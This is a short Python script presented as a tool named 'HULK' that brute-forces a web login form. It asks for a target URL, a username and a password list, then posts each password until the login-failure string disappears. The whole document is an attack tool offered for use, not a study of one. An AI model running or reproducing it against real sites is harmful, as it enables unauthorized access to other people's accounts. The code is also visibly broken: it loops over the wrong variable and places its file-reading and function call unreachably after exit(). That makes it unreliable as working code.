import requests
from termcolor import colored
 
logo = '''
                / __  ___  _  __ __
     |_|| ||  |/ (_  |_/ \|_)/  |_ 
     | ||_||__|\ __) | \_/| \\__|__
       
       coded by Sumalya Chatterjee
'''
print(logo)

url = input('[+] HULK Wants Page URL: ')
username = input ("[+] HULK Want you to Enter Username For The Account To Bruteforce: ")
print("HULK never appreciate you to do so :( ")
password_file = input("[+] Enter Password File To Use : " )
login_failed_string = input ('[+] Enter String That Occurs When Login Fails: ')

def cracking (username, url):
  for password in password:
      password = password.strip()
      print(colored(('Trying ' + password), 'red'))
      data = {'username': username, 'password': password, 'Login': 'submit'}
      response = requests.post(url, data= data)
      if login_failed_string in response.content.decode():
          pass
      else :
            print(colored(('[+] found username: ==> ' + username), 'green'))
            print(colored(('[+] Found Password: ==> ' + password), 'green'))
            exit()


            with open(password_file, 'r') as passwords:
                cracking(username.url)

                print("[!!] Password Didn't Match In Given List")